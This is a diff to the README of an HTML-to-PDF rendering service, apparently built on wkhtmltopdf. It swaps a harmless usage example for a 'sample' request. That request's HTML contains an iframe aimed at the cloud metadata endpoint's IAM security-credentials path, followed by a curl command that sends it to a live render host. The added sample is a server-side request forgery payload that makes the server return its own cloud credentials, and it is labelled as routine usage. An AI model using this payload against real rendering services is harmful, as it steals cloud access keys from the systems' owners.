@@ -11,7 +11,12 @@ Python Libraries (pip install -r requirements.txt)
 
 wkhtmltopdf (must be installed at the OS level - https://wkhtmltopdf.org/downloads.html)
 
-## Usage
+## Sample Usage
 _Modify the string in the referer check to be the domain where you're hosting it, or just remove the check depending on your needs_
 
-``curl -H "Referer: api.uuw.app" --json "{\"content\":\"<HTML><BODY><H1>HTML Rendering Successful</H1></BODY></HTML>\"} http://render.uuw.app:8080/render``
+Create a test file containing the HTML:
+``{"content":"<HTML><BODY>Metadata output:</BR><IFRAME src=\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\" width=1000 height=1000></IFRAME></BODY></HTML>"}
+``
+
+Now use curl to send it
+``curl -H "Referer: api.uuw.app" --json @testfile.json http://render.uuw.app/render``
